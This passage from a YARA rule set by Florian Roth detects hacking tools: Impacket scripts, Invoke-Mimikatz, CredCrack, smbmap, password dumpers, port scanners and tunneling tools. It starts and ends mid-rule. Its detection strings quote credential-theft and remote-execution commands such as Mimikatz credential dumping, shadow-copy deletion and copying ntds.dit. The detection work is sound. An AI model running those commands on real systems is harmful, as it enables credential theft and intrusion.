		$s3 = "[*] Host: {r} Domain: {d} User: {u} Password: {p}" fullword ascii
		$s4 = "$creds = Invoke-Mimikatz -DumpCreds;" fullword ascii
		$s5 = "{w}[*]{lg} Host: {r} Domain: {d} User: {u} Password: {p}{n}s2" fullword ascii
		$s6 = "winexe --system //{} -U {}/{}%{} 'cmd /c net group \"Domain Admins\" /domain'R" fullword ascii
		$s7 = "./credcrack.py -d acme -u bob -f hosts -es" fullword ascii
		$s8 = "{y}[*] Host: {r} Domain: {d} User: {u}   Password: {p}{n}R" fullword ascii
		$s9 = "Remote host IP to harvest creds from" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 800KB and 1 of them
}

rule PY_Hack_WmiExec {
	meta:
		description = "SMB/WMI related security assessment scripts - file wmiexec.py"
		author = "Florian Roth"
		reference = "https://goo.gl/56ZfBS"
		date = "2015-11-21"
		score = 80
		yaraexchange = "No distribution without author's consent"
		hash = "261f2b6b380863b2b41e9311188194ebb731b2bbcc135aefbae9a9cd8e5623e3"
	strings:
		$s1 = "[!] Launching semi-interactive shell - Careful" fullword ascii
		$s2 = "self.__shell = 'cmd.exe /Q /c '" fullword ascii
		$s3 = "executer = WMIEXEC(' '.join(options.command), username, password, domain, options.hashes, options.aesKey, options.share, options" ascii
		$s4 = "A similar approach to smbexec but executing commands through WMI." fullword ascii
	condition:
		filesize < 100KB and 1 of them
}

rule PYEXE_Hack_WmiQuery {
	meta:
		description = "SMB/WMI related security assessment scripts - file wmiquery.exe"
		author = "Florian Roth"
		reference = "https://goo.gl/56ZfBS"
		date = "2015-11-21"
		score = 80
		yaraexchange = "No distribution without author's consent"
		hash = "568bd47d6f303d324498266ade6613f7c2b219090e25a8848001485797aa2b71"
	strings:
		$s1 = "[[domain/]username[:password]@]<targetName or address>s" fullword ascii
		$s2 = "Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters." ascii
		$s3 = "[!] Press help for extra shell commands(" fullword ascii
		$s4 = "! {cmd}                    - executes a local shell cmd" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 1 of them
}

rule PY_Hack_WmiQuery {
	meta:
		description = "SMB/WMI related security assessment scripts - file wmiquery.py"
		author = "Florian Roth"
		reference = "https://goo.gl/56ZfBS"
		date = "2015-11-21"
		score = 80
		yaraexchange = "No distribution without author's consent"
		hash = "3328e3980a136b42a8d8e9d605b543b45c9f530238f8bc1fb31122e717ab4260"
	strings:
		$s0 = "[[domain/]username[:password]@]<targetName or address>" ascii
		$s6 = "password = getpass(\"Password:\")" fullword ascii
		$s13 = "NTLM hashes, format is LMHASH:NTHASH" ascii
	condition:
		filesize < 100KB and 2 of them
}

rule PY_Hack_SecretsDump {
	meta:
		description = "SMB/WMI related security assessment scripts - file secretsdump.py"
		author = "Florian Roth"
		reference = "https://goo.gl/56ZfBS"
		date = "2015-11-21"
		score = 80
		yaraexchange = "No distribution without author's consent"
		hash = "9dc300a8783d5d972e657fbaabe36759571fef0ec2f362de72690f8b1ed38505"
	strings:
		$s1 = "%COMSPEC% /C vssadmin delete shadows /For=" ascii
		$s2 = "dumper = DumpSecrets(address, username, password, domain, options)" fullword ascii
		$s3 = "Dumping local SAM hashes (uid:rid:lmhash:nthash)" ascii
		$s4 = "execute.bat" fullword ascii
		$s5 = "Dump password history" ascii
		$s6 = "Target system bootKey:" fullword ascii
		$s7 = "lmhash, hexlify(NTHash)" fullword ascii
	condition:
		filesize < 300KB and 2 of them
}

rule PY_Hack_SmbExec {
	meta:
		description = "SMB/WMI related security assessment scripts - file smbexec.py"
		author = "Florian Roth"
		reference = "https://goo.gl/56ZfBS"
		date = "2015-11-21"
		score = 80
		yaraexchange = "No distribution without author's consent"
		hash = "fe127d049e9c8838925a9032028cfb3f46d514ded035c3c39f15ea35d84578fb"
	strings:
		$s1 = "don\\'t ask for password (useful for -k)" fullword ascii
		$s2 = "smbConfig.set('global','log_file',SMBSERVER_DIR + '/smb.log')" fullword ascii
		$s3 = "executer = CMDEXEC(options.protocol, username, password, domain, options.hashes, options.aesKey, options.k, options.mode, option" ascii
	condition:
		filesize < 50KB and 2 of them
}

rule PYEXE_Hack_AtExec {
	meta:
		description = "SMB/WMI related security assessment scripts - file atexec.exe"
		author = "Florian Roth"
		reference = "https://goo.gl/56ZfBS"
		date = "2015-11-21"
		score = 80
		yaraexchange = "No distribution without author's consent"
		hash = "28a4fa6b2d22fbe1243c0b7f00157a355882010fe86ffb280ecbcc58cee34e54"
	strings:
		$s1 = "<Arguments>/C %s &gt; %%windir%%\\Temp\\%s 2&gt;&amp;1</Arguments>" fullword ascii
		$s2 = "command to execute at the target" fullword ascii
		$s3 = "_TSCH_EXEC__passwordt" fullword ascii
		$s4 = "Deleting file ADMIN$\\Temp\\%s('" fullword ascii
		$s5 = "Attempting to read ADMIN$\\Temp\\%ss" fullword ascii
		$s6 = "When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work(" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and 2 of them
}

rule PYEXE_Hack_SmbExec {
	meta:
		description = "SMB/WMI related security assessment scripts - file smbexec.exe"
		author = "Florian Roth"
		reference = "https://goo.gl/56ZfBS"
		date = "2015-11-21"
		score = 80
		yaraexchange = "No distribution without author's consent"
		hash = "4678dca531e911aef9a1889b2c205a1ec06c7d50fcf8656faa0b7024959103c8"
	strings:
		$s1 = "_CMDEXEC__usernamet" fullword ascii
		$s2 = "_RemoteShell__commandt" fullword ascii
		$s3 = "[!] Launching semi-interactive shell - Careful what you executei" fullword ascii
		$s4 = "execute.bat" ascii
		$s7 = "execute_remoteR" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and 2 of them
}

rule PYEXE_Hack_WmiExec {
	meta:
		description = "SMB/WMI related security assessment scripts - file wmiexec.exe"
		author = "Florian Roth"
		reference = "https://goo.gl/56ZfBS"
		date = "2015-11-21"
		score = 80
		yaraexchange = "No distribution without author's consent"
		hash = "5bbf96f2a907c5052d40f9c1b8c8eb4eecc7f2b8673f6f8fe7d05ea80f3134a1"
	strings:
		$s1 = "_WMIEXEC__passwordt" fullword ascii
		$s2 = "[!] Press help for extra shell commandsi" fullword ascii
		$s3 = "[!] Launching semi-interactive shell - Careful what you execute" fullword ascii
		$s4 = "! {cmd}                    - executes a local shell cmd" fullword ascii
		$s5 = "_WMIEXEC__aesKeyt" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 2 of them
}

rule PY_Hack_AtExec {
	meta:
		description = "SMB/WMI related security assessment scripts - file atexec.py"
		author = "Florian Roth"
		reference = "https://goo.gl/56ZfBS"
		date = "2015-11-21"
		score = 80
		yaraexchange = "No distribution without author's consent"
		hash = "3d4526e6f5b7415f8c5ff225b61284dc6b24211cdcfcc0b9367d8604266b320e"
	strings:
		$s1 = "atsvc_exec" fullword ascii
		$s2 = "Deleting file ADMIN$\\\\Temp\\\\" ascii
		$s3 = "<Command>cmd.exe</Command>" fullword ascii
		$s4 = "<Arguments>/C %s &gt; %%windir%%\\\\Temp\\\\%s 2&gt;&amp;1</Arguments>" fullword ascii
	condition:
		filesize < 50KB and all of them
}

rule PY_Hack_SamRDump {
	meta:
		description = "SMB/WMI related security assessment scripts - file samrdump.py"
		author = "Florian Roth"
		reference = "https://goo.gl/56ZfBS"
		date = "2015-11-21"
		score = 80
		yaraexchange = "No distribution without author's consent"
		hash = "349ea5b251efe85cf82fbc4cb08d6e9e2d852a00c11bb80f0cdc40066107b0a1"
	strings:
		$s1 = "dumper = SAMRDump(options.protocol, username, password" ascii
		$s2 = "Dumps the list of users and shares registered present at" ascii
		$s3 = "Description: DCE/RPC SAMR dumper" ascii
		$s4 = "username = '', password = '', domain = '', hashes = None, aesKey=None, doKerberos = False):" fullword ascii
		$s5 = "This script downloads the list of users for the target system." ascii
		$s7 = "Use Kerberos authentication. Grabs credentials from ccache file" ascii
	condition:
		filesize < 150KB and 1 of them
}

rule PYEXE_Hack_SamrDump {
	meta:
		description = "SMB/WMI related security assessment scripts - file samrdump.exe"
		author = "Florian Roth"
		reference = "https://goo.gl/56ZfBS"
		date = "2015-11-21"
		score = 80
		yaraexchange = "No distribution without author's consent"
		hash = "5090aa650e720c1457901dd6fae7eaa7e7dc6e9525a92b4011302c380045380e"
	strings:
		$s1 = "Dumps the list of users and shares registered present" fullword ascii
		$s2 = "_SAMRDump__password" ascii
		$s3 = "Error listing users: %s(" fullword ascii
		$s4 = "don't ask for password (useful for -k)s" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 175KB and all of them
}

rule PYEXE_Hack_SecretsDump {
	meta:
		description = "SMB/WMI related security assessment scripts - file secretsdump.exe"
		author = "Florian Roth"
		reference = "https://goo.gl/56ZfBS"
		date = "2015-11-21"
		score = 80
		yaraexchange = "No distribution without author's consent"
		hash = "e0ba308112e3f8fc80febe2d9d578dfdd2443c4d396b7e38e6c7f49ff317d740"
	strings:
		$s1 = "%%COMSPEC%% /C copy %s%s %%SYSTEMROOT%%\\Temp\\%ss5" fullword ascii
		$s2 = "%TEMP%\\execute.bat" ascii
		$s3 = "_DumpSecrets__SAMHashest" fullword ascii
		$s4 = "hashedBootKey CheckSum failed, Syskey startup password probably in use! :((" fullword ascii
		$s5 = "Dumping cached domain logon information" ascii
		$s6 = "(uid:encryptedHash:longDomain:domain)" ascii
		$s7 = "Dumping local SAM hashes" ascii
		$s8 = "(uid:rid:lmhash:nthash)" ascii
		$s9 = "Shows pwdLastSet attribute for each NTDS.DIT account." fullword ascii
		$s10 = "Dump password history" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}

rule PS_Invoke_Mimikatz {
	meta:
		description = "SMB/WMI related security assessment scripts - file Invoke-Mimikatz.ps1"
		author = "Florian Roth"
		score = 80
		yaraexchange = "No distribution without author's consent"
		date = "2015-11-21"
		hash = "1b441fde04d361a6fd7fbd83e969014622453c263107ce2bed87ad0bff7cf13f"
	strings:
		$s1 = "Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp" fullword ascii
		$s2 = "Find Invoke-ReflectivePEInjection" fullword ascii
		$s3 = "#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory" fullword ascii
		$s4 = "$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr" fullword ascii
		$s5 = "$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory" fullword ascii
	condition:
		filesize < 1000KB and all of them
}

rule PY_Hack_SmbSpider {
	meta:
		description = "SMB/WMI related security assessment scripts - file smbspider.py"
		author = "Florian Roth"
		score = 80
		yaraexchange = "No distribution without author's consent"
		date = "2015-11-21"
		hash = "964b4e835a82bedd42b1f04907ab7f6e866df2ae242b7b8695149c7d6f39ee83"
	strings:
		$s1 = "How about a nice game of spidering" fullword ascii
		$s2 = "SMB Spider will search shares." ascii
		$s3 = "Error reading file or IP Address notation:" fullword ascii
		$s4 = "Done spidering..." ascii
	condition:
		filesize < 100KB and 2 of them
}

rule PY_Hack_SmbMap {
	meta:
		description = "SMB/WMI related security assessment scripts - file smbmap.py"
		author = "Florian Roth"
		score = 80
		yaraexchange = "No distribution without author's consent"
		date = "2015-11-21"
		hash = "b2563ab5604c24d74e57ef02a9cb66490b661b04a22b325d8bd16a3e87d6d361"
	strings:
		$s1 = ".txt echo ImHere" ascii
		$s2 = "Execute a command ex. 'ipconfig /all'" fullword ascii
		$s3 = "tmp_dir = self.exec_command(host, share, 'echo %TEMP%', False).strip()" fullword ascii
		$s4 = "powershell -command \"Start-Process cmd -ArgumentList" ascii
		$s5 = "Options for executing commands on the specified host" fullword ascii
		$s6 = "net_disks_raw = self.exec_command(host, share, 'net use', False)" fullword ascii
		$s7 = "Download a file from the remote system, ex.'C$" ascii
	condition:
		filesize < 300KB and all of them
}

rule PYEXE_Hack_SmbMap {
	meta:
		description = "SMB/WMI related security assessment scripts - file smbmap.exe"
		author = "Florian Roth"
		score = 80
		yaraexchange = "No distribution without author's consent"
		date = "2015-11-21"
		hash = "04bb5365197e889894339a46e0c9b089394b0a9c22631c45919aa94aa14c5d8e"
	strings:
		$s1 = "powershell -command \"Start-Process cmd -ArgumentList" ascii
		$s2 = "(requies admin access to execute commands, and powershell on victim host)" fullword ascii
		$s3 = "Download a file from the remote system, ex.'C$\\temp\\passwords.txt's" fullword ascii
		$s4 = "Upload a file to the remote system ex. '/tmp/payload.exe C$\\temp\\payload.exe's" fullword ascii
		$s5 = "$ python smbmap.py -u jsmith -p password1 -d workgroup -H 192.168.0.1" fullword ascii
		$s6 = "cmd /c \"if exist %s\\%s.txt echo ImHere\"R" fullword ascii
		$s7 = "_CMDEXEC__passwordt" fullword ascii
		$s8 = "[+] Job %s started on %s, result will be stored at %s\\%s.txts#" fullword ascii
		$s9 = "[!] Error writing to C$, attempting to start SMB server to store outputR" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 400KB and 1 of them
}

rule PYEXE_Hack_SmbSpider {
	meta:
		description = "SMB/WMI related security assessment scripts - file smbspider.exe"
		author = "Florian Roth"
		score = 80
		yaraexchange = "No distribution without author's consent"
		date = "2015-11-21"
		hash = "97a6760bfb12eef075485cc80ec63033f8f282eee186e12f156b8123def935c5"
	strings:
		$s1 = "Connecting to %s was successful! How about a nice game of spidering" fullword ascii
		$s2 = "File of keywords to search for, i.e., passwords" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and all of them
}

rule PY_Hack_CredCrack {
	meta:
		description = "SMB/WMI related security assessment scripts - file credcrack.py"
		author = "Florian Roth"
		score = 80
		yaraexchange = "No distribution without author's consent"
		date = "2015-11-21"
		hash = "99106fc5d43872c374885c01b1de1064b23336ad40abe3272110160501438b24"
	strings:
		$s1 = "winexe --system //{} -U {}/{}%{} 'cmd /c net group" ascii
		$s2 = "{}[!]{} Error listing shares on" fullword ascii
		$s3 = "Remote host IP to harvest creds from." fullword ascii
		$s4 = "{}[!]{} Failed to obtain domain admin list from" fullword ascii
	condition:
		filesize < 60KB and all of them
}

rule PY_Hack_NdtsPwDump {
	meta:
		description = "SMB/WMI related security assessment scripts - file ntdspwdump.py"
		author = "Florian Roth"
		score = 80
		yaraexchange = "No distribution without author's consent"
		date = "2015-11-21"
		hash = "e14fb90b6782e6fefe6e536c0d242142610351918c82f7bc8850afcd8fb052ff"
	strings:
		$s1 = "print \"%s:%s:%s:%s:::\" % (user, uid, lm_hash, nt_hash)" fullword ascii
		$s2 = "pwdump-alike text format." fullword ascii
		$s3 = "lm_hash = \"aad3b435b51404eeaad3b435b51404ee\"" fullword ascii
		$s4 = "nt_hash = \"31d6cfe0d16ae931b73c59d7e0c089c0\"" fullword ascii
	condition:
		filesize < 100KB and 1 of them
}

rule PYEXE_Hack_NtdsPwDump {
	meta:
		description = "SMB/WMI related security assessment scripts - file ntdspwdump.exe"
		author = "Florian Roth"
		score = 80
		yaraexchange = "No distribution without author's consent"
		date = "2015-11-21"
		hash = "af852bf185594bb431505598996059c7812430ce56220cb8e0af27c074e361fa"
	strings:
		$s1 = "usage: %s <output file of NTDSXtract's dsusers.py script>i" fullword ascii
		$s2 = "Script to convert the output of NTDSXtract's dsusers.py script into" fullword ascii
		$s3 = "SAM Account name:\\s+(.+?)" fullword ascii
		$s4 = "ntdspwdump.pyt" fullword ascii
		$s5 = "pwdump-alike text format." fullword ascii
		$s6 = ".*?Password hashes:" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and 1 of them
}

rule PS_Invoke_NinjaCopy {
	meta:
		description = "SMB/WMI related security assessment scripts - file Invoke-NinjaCopy.ps1"
		author = "Florian Roth"
		score = 80
		yaraexchange = "No distribution without author's consent"
		date = "2015-11-21"
		hash = "3aa58eece809e7a7a0be0f2ae2f6dfee8fcccf0aa7621fc4199ac6bda3b4e226"
	strings:
		$s10 = "Invoke-NinjaCopy -Path \"c:\\windows\\ntds\\ntds.dit\" -LocalDestination \"c:\\windows\\temp\\ntds.dit\"" fullword ascii
	condition:
		uint16(0) == 0x7566 and filesize < 1300KB and all of them
}

rule Hacktool_Patator_Windows {
	meta:
		description = "Detects password brute force tool Patator - file patator-windows.exe"
		author = "Florian Roth"
		reference = "https://github.com/maaaaz/patator-windows"
		date = "2015-11-30"
		score = 76
		hash = "5192eb798c2c97dcb3926af461c528f2333c0de929a4ef6c54eb5f81e1e0d7b0"
	strings:
		$s1 = "Failed to get executable path. " fullword ascii
		$s2 = "impacket.system_errors(" fullword ascii
		$s3 = "paramiko.ssh_gss(" fullword ascii
		$s4 = "telnetlib(" fullword ascii
		$s5 = "bcx_Oracle.pyd" fullword ascii
	condition:
		uint16(0) == 0x5a4d and all of them
}

rule spraywmi {
	meta:
		description = "SpryWMI remote command execution and remote shell tool - file spraywmi.py"
		author = "Florian Roth"
		reference = "http://goo.gl/tgAZUk"
		date = "2015-12-08"
		score = 75
		hash = "954878142997504c9109c12529e478e5165c8c0aa0ec21a710821d3bc984b837"
	strings:
		$s1 = "[*] Sweeping targets for open TCP port 135 first, then moving through. Be patient." fullword ascii
		$s2 = "[*] Running in the background, everything is completed but keeping a loop so subprocess has time to complete..\"" fullword ascii
		$s3 = "Usage: python spraywmi.py <domain> <username> <password> <CIDRrange or file> <payload> <LHOST> <LPORT>" ascii
	condition:
		filesize < 30KB and 1 of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-12-08
	Identifier: FireCat Tunneling Tool
*/

rule FireCat_Tunneling_Tool_1 {
	meta:
		description = "FireCat Tunneling Hack Tool"
		author = "Florian Roth"
		reference = "http://goo.gl/FDlgF0"
		date = "2015-12-08"
		super_rule = 1
		hash1 = "b70bb70e091d76f70da7b7d1fa03fe4ff3775bfb156f2776ed6a5a4ee63ae375"
		hash2 = "b7157ed659c52fee5d962f48ba71bec78c13e13c766e597a0df0399076bb694c"
	strings:
		$s0 = "c:\\windows\\system32\\cmd.exe" fullword ascii
		$s1 = "Failed to create shell stdin pipe, error = %s" fullword ascii
		$s4 = "Failed to create ReadShell session thread, error = %s" fullword ascii
		$s5 = "SessionReadShellThreadFn exitted, error = %s" fullword ascii
		$s6 = "Failed to execute shell" fullword ascii
		$s15 = "HOSTDOWN      " fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and all of them
}

rule FireCat_Tunneling_Tool_2 {
	meta:
		description = "FireCat Tunneling Hack Tool"
		author = "Florian Roth"
		reference = "http://goo.gl/FDlgF0"
		date = "2015-12-08"
		score = 75
		super_rule = 1
		hash1 = "f2911f53ad2dd87fc812b832d488c48672604a08448b58e19a9471abfb8fe06f"
		hash2 = "4b6244e0f5e6c2372ca539ae11988a71d22295e81aec3b208479e41e00dd8d7a"
		hash3 = "b526f7fd0a4e29a767eef70dc0ba6c5d00c926e93707b71fdd47cf648db9b0f9"
		hash4 = "b70bb70e091d76f70da7b7d1fa03fe4ff3775bfb156f2776ed6a5a4ee63ae375"
		hash5 = "b7157ed659c52fee5d962f48ba71bec78c13e13c766e597a0df0399076bb694c"
	strings:
		$s1 = "Target: Establishing tunnel with remote host on %s:%d" fullword ascii
		$s2 = "Consultant: Waiting for the remote target to establish the tunnel on port %d" fullword ascii
		$s3 = "Consultant: Got connection from remote target %s" fullword ascii
		$s4 = "-t <port>       Wait for incoming connections from target on this port" fullword ascii
		$s5 = "-H <target>     (optional) Connect to <target> inside the target network" fullword ascii
		$s6 = "Consultant: Tunnel is now up on localhost:%d" fullword ascii
		$s7 = "-s <port>       Wait for incoming connections from you on this port" fullword ascii
		$s8 = "-t <port>       Connect back to TCP <port> on <host>" fullword ascii
	condition:
		filesize < 500KB and all of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-12-13
	Identifier: ReactOS CMD
*/

rule ReactOS_CMD {
	meta:
		description = "Detects ReactOS command line - often used by attackers - from files cmd.dll, cmd.exe"
		author = "Florian Roth"
		reference = "http://blog.didierstevens.com/2015/12/13/windows-backup-privilege-cmd-exe/"
		date = "2015-12-13"
		score = 65
	strings:
		$s1 = "SOFTWARE\\Microsoft\\Command Processor" fullword wide
		$s2 = "EXIT     Quits the CMD.EXE program (command interpreter)." fullword wide
		$s3 = "ReactOS Command Processor" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}

rule ReactOS_CMD_debug_priv {
	meta:
		description = "Detects modified ReactOS command line by Didier Stevens to access files with highest privileges"
		author = "Florian Roth"
		reference = "http://blog.didierstevens.com/2015/12/13/windows-backup-privilege-cmd-exe/"
		date = "2015-12-13"
		score = 100
		hash1 = "d7c18b90bf4af51638ddda7ba709dd78d04a7560ce2fe145bf56a68029ab878a"
		hash2 = "52da89695eb9eff88b9d7f39461a701ca9f2754f6eede53f8de8eb662abdbeb5"
	strings:
		$s1 = "SOFTWARE\\Microsoft\\Command Processor" fullword wide
		$s2 = "EXIT     Quits the CMD.EXE program (command interpreter)." fullword wide
		$s3 = "ReactOS Command Processor" fullword wide
		$s4 = "Modifications by Didier Stevens" wide
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-12-24
	Identifier: Hacking tools port scanner
*/

rule Hacktool_scanners_CBPS {
	meta:
		description = "Hacktool port scanners - file CBPS.exe"
		author = "Florian Roth"
		score = 65
		date = "2015-12-24"
		hash = "6a46484e897d25d6d5f95dcb2082925dd2457a96869b1e82f46a0b6c8ab1d6c6"
	strings:
		$s1 = "Port scanner for the command line" fullword wide
		$s2 = "CMD BlueBit's Port Scanner - CBPS" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and all of them
}

rule Hacktool_MingSweeper {
	meta:
		description = "Hacktool port scanners - file MingSweeper.exe"
		author = "Florian Roth"
		score = 65
		date = "2015-12-24"
		hash = "851554945afb957decef3538e4d1f85c0d73bca9573539f7cd2cf6452cc84815"
	strings:
		$s1 = "Mingsweeper Target Database (.mtd) |*.mtd" ascii
		$s2 = "Discarding results as bogus, this scan type is not suitable for all targets" fullword ascii
		$s3 = "Merciless - Fast network/Stable targets" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them
}

rule Hacktool_PortScan2 {
	meta:
		description = "Hacktool port scanners - file PortScan2.exe"
		author = "Florian Roth"
		score = 65
		date = "2015-12-24"
		hash = "a3285654d3a34895207b605c552c8829769313537cd866692239f7c9df0a6381"
	strings:
		$s1 = "PortScan" fullword wide
		$s2 = "ScanPort" fullword ascii
		$s3 = "%d.%d.%d.%d: %d" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and all of them
}

rule Hacktool_NetworkActivPortScannerV4_0 {
	meta:
		description = "Hacktool port scanners - file NetworkActivPortScannerV4.0.exe"
		author = "Florian Roth"
		score = 65
		date = "2015-12-24"
		hash = "070838e4a8f2b531da6539a83f878493a90dfd633607aac480271b685fa52aed"
	strings:
		$s1 = "V:\\Programming\\NetworkActiv Scanner_Shim\\NetworkActiv Scanner_Shim\\" ascii
		$s2 = "NetworkActiv_Scanner_Shim.NetworkActivPortScannerV" ascii
		$s3 = "PortListBackground.bmp - Left list background picture (not recommended)." fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and 1 of them
}

rule Hacktool_scanner_knocker {
	meta:
		description = "Hacktool port scanners - file knocker.exe"
		author = "Florian Roth"
		score = 65
		date = "2015-12-24"
		hash = "de38944df3f08c770464a0a1fed010446ad09cefb24e3f572c0ab370b6e724d2"
	strings:
		$s1 = "|--=| k n o c k e r -- t h e -- n e t -- p o r t s c a n n e r |=-=[logfile]=-|" fullword ascii
		$s2 = "%s, the net portscanner. Version %s-Win32 (%s)" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and 1 of them
}

rule Hacktool_NScan {
	meta:
		description = "Hacktool port scanners - file nscan.exe"
		author = "Florian Roth"
		score = 65
		date = "2015-12-24"
		hash = "586f403c26e319089d2cb1033b34beead774f20bdb10e7c8cb26d922895b3b41"
	strings:
		$s1 = "C:\\localhost.log" fullword ascii
		$s2 = "NScan.Tip.PortRangeToken" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1200KB and all of them
}

rule Hacktool_PortScan {
	meta:
		description = "Hacktool port scanners - from files PortScan1.exe, PortScan3.exe, PortScan4.exe"
		author = "Florian Roth"
		score = 65
		date = "2015-12-24"
		super_rule = 1
		hash1 = "4bfc30a887a8637745840bf01afd01de3e5e6741262088b3e512dd893c5c6a94"
		hash2 = "479532c3ec7209ff251f457ce8acd9b1bc04197c97e02fd0a85107d9053dfe5f"
		hash3 = "93ca8122a322cc3e901b6c00da531bb659c332e91d745d4922dd65e879a1b5ec"
	strings:
		$s1 = "Administrator account has empty password" fullword ascii
		$s2 = "%8u 0x%08X %10.10s %8.8s 0x%08X 0x%08I64X %4d.%04d.%05d.%06d %4d.%04d.%05d.%06d - %S" fullword ascii
		$s3 = "PortScan.dbg" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2015-12-24
	Identifier: PWDump
*/

rule Hacktool_PWDump_1 {
	meta:
		description = "Hacking tool password dumper - file pwdump2.exe"
		author = "Florian Roth"
		score = 65
		date = "2015-12-24"
		hash = "5692fac4e565a75db52025d28522bb05cdfd0acd61d6762b1cf93722ed2c29d1"
	strings:
		$s1 = "---------------------------------------------- END DUMP ---------------------------------------------" fullword ascii
		$s2 = "%s_hist%d:\"\":\"\":%s:%s" fullword ascii
		$s3 = "%d dumped accounts" fullword ascii
		$s4 = "[ERR] Registry error, are you admin?" fullword ascii
		$s5 = "[ERR] SYSKEY is not stored locally, not supported yet" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and 1 of them
}

rule Hacktool_PWDump_2 {
	meta:
		description = "Hacking tool password dumper - file pwdump1.exe"
		author = "Florian Roth"
		score = 65
		date = "2015-12-24"
		hash = "4dbeceb0b346b3f9d10f29acef37f1bf21d62f612e03c1ab50d5da9dafe1dcf9"
	strings:
		$s1 = "\\PwDumpDebug\\PwDump.pdb" ascii
		$s2 = "Usage: %s [-x][-n][-h][-o output_file][-u user][-p password][-s share] machineName" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 800KB and 1 of them
}

rule Hacktool_fgdump {
	meta:
		description = "Hacking tool password dumper - file pwdump3.exe"
		author = "Florian Roth"
		score = 65
		date = "2015-12-24"
		hash = "7c5b31e76189ca7bb298dd883ddbc15f30b969c3cc03f4d196a943cfbb9c5d5e"
	strings:
		$s1 = "fgdump.exe" fullword wide
		$s2 = " fgdump 1.x" fullword wide
		$s3 = "FGDUMP_SH" fullword ascii
		$s4 = "Copyright (C) 2008 Foofus Networking (www.foofus.net)" fullword wide
		$s5 = "COLON$PwdTemp" fullword ascii
		$s6 = "Foofus Networking (www.foofus.net)" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 800KB and 1 of them
}

/*
	Yara Rule Set
	Author: Trojan Naid
	Date: 2015-12-29
	Identifier: Naid
*/

rule Trojan_Naid_CrOz_Hax {
	meta:
		description = "Detects a malware reported as Trojan.Naid - file CrOz+Hax.exe"
		author = "Florian Roth"
		reference = "https://goo.gl/1HtWgm"
		date = "2015-12-29"
		hash = "253b1d97edd3e4e2615ccbfe7b0d5d5a46fc688f49a1f419ffe5017e1972cbea"
	strings:
		$s1 = "CrOz HaX" fullword wide
		$s2 = "%____=KERNt" fullword ascii
		$s3 = "HaX by HlTMAN" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 350KB and 1 of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-01-04
	Identifier: Htran
*/

rule Htran_LCX {
	meta:
		description = "Detects new Htran versions named LCX"
		author = "Florian Roth"
		reference = "VT Research"
		date = "2016-01-04"
		super_rule = 1
		score = 90
		hash1 = "809f20c2642eb7db4b78493cf9f3c3963d294d0376b569adcb7d22c0b8fc06ee"
		hash2 = "e5816371fe45c727a42e0b7aec986e6dbd615eb7489498b6e687e12ba7f246da"
	strings:
		$s0 = "\\LCX\\Debug\\lcx.pdb" fullword ascii
	condition:
		uint16(0) == 0x5a4d and all of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-02-02
	Identifier: Mimikatz 2.1
*/

rule mimilove {
	meta:
		description = "Mimikatz 2.1 Mimilove - file mimilove.exe"
		author = "Florian Roth"
		reference = "not set"
		date = "2016-02-02"
		score = 80
		hash = "d4a867595fd682606371c60cdc6de6ba9a1c33c012f0764d887be51e4d6a1b84"
	strings:
		$s1 = "ERROR mimilove_lsasrv" fullword wide
		$s2 = "mimilove.exe" fullword wide
		$s3 = "/ ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )" fullword wide
	condition:
		( uint16(0) == 0x5a4d and filesize < 70KB and 1 of them ) or 2 of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-02-04
	Identifier: Katana - Mimikatz Version LT
*/

rule Mimikatz_Katana_LT_EXE {
	meta:
		description = "Detects Mimikatz version named katana (LT origin) / and Powerkatz.dll (Powershell Mimikatz version)"
		author = "YarGen Rule Generator"
		reference = "https://twitter.com/Cyb3rOps/status/695198395351359490"
		date = "2016-02-04"
		score = 70
		super_rule = 1
		hash1 = "5b8d6afe153d526dde10eb7d4b5749fd57e315c3a2a7ffa93d8eee7de872cc04"
		hash2 = "d225468d04cfa8813163a30b96264f3d9169076d46195d4493f0b562be72fa79"
	strings:
